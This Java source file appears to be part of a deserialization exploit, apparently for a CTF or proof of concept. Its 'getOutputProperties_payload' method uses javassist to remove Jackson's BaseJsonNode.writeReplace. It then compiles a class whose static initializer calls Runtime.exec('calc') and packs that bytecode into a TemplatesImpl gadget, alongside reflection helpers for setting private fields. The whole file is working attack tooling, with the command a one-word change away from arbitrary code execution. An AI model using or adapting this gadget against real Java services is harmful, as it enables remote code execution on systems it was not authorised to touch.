import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import com.fasterxml.jackson.databind.node.POJONode;

public class Reflections {

    public static Object getInstance(String className, Object... initargs) throws Exception {
        Class<?> clazz = Class.forName(className);
        Constructor<?>[] constructors = clazz.getDeclaredConstructors();

        for (Constructor<?> constructor : constructors) {
            if (constructor.getParameterCount() == initargs.length) {
                constructor.setAccessible(true);
                return constructor.newInstance(initargs);
            }
        }

        throw new NoSuchMethodException("No suitable constructor found for class: " + className);
    }

    public static Object getOutputProperties_payload() throws Exception {
        CtClass ctClass1= ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace=ctClass1.getDeclaredMethod("writeReplace");
        ctClass1.removeMethod(writeReplace);
        ctClass1.toClass();


        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("        try {\n" +
                "            Runtime.getRuntime().exec(\"calc\");\n" +
                "        } catch (Exception ignored) {\n" +
                "        }");
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "AsaL1n");
        setFieldValue(templatesImpl,"_tfactory",new TransformerFactoryImpl());

        return templatesImpl;
    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}
